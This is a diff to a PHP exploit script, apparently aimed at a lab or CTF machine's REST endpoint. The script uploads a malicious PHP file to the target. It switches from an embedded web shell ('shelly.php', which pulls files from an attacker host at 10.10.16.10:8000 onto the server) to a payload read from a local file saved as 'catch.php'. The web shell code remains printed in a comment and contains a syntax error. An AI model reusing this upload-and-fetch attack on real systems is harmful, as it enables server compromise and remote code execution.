@@ -26,7 +26,18 @@ $endpoint_path = '/rest';
 $endpoint = 'rest_endpoint';
 
 
-$phpCode = <<<'EOD'
+$myfile = fopen("payload1.txt", "r") or die("Unable to open file!");
+$payload1 = fread($myfile,filesize("payload1.txt"));
+$url = '10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+ $file = [
+ 'filename' => 'catch.php',
+ 'data' => $payload1
+];
+
+
+/*$phpCode = <<<'EOD'
 <?php
  if(isset($_REQUEST['fupload'])) {
   file_put_contents($_REQUEST]'fupload'], file_get_contents("http://10.10.16.10:8000/" . $_REQUEST['fupload']));
@@ -40,7 +51,7 @@ $file = [
     'filename' => 'shelly.php',
     'data' => $phpCode
 ];
-
+*/
 
 
 $browser = new Browser($url . $endpoint_path);
